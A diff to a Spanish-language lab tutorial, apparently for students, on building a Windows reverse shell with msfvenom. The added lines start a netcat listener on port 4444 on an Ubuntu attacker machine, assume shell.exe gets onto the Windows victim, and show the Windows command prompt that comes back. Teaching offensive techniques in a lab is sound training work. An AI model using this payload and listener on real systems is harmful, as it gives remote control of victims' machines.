@@ -255,6 +255,25 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f exe
 - `-f exe`: Define el formato de salida (format). En este caso, le indica a msfvenom que compile el payload como un archivo ejecutable tradicional de Windows (.exe).
 - `-o shell.exe`: Define el nombre del archivo de salida (output). El ejecutable generado se guardará en tu directorio actual con el nombre shell.exe
 
+- En la máquina Ubuntu, ejecutar:
+
+```bash
+sudo nc -lnvp 4444
+```
+
+- Se supone que el binario producido (`shell.exe`) es introducido de alguna manera a la máquina de Windows, y al ejecutarse produce esta conexión en la máquina atacante:
+
+```bash
+user@VM-Ubuntu:~$ sudo nc -lnvp 4444
+[sudo] password for user:
+Listening on 0.0.0.0 4444
+Connection received on 192.168.56.102 63966
+Microsoft Windows [Versión 10.0.26200.9168]
+(c) Microsoft Corporation. Todos los derechos reservados.
+
+C:\Users\operador_alumno\Downloads>
+```
+
 ### Paso 11 — Buscamos otros payloads
 
 ```bash
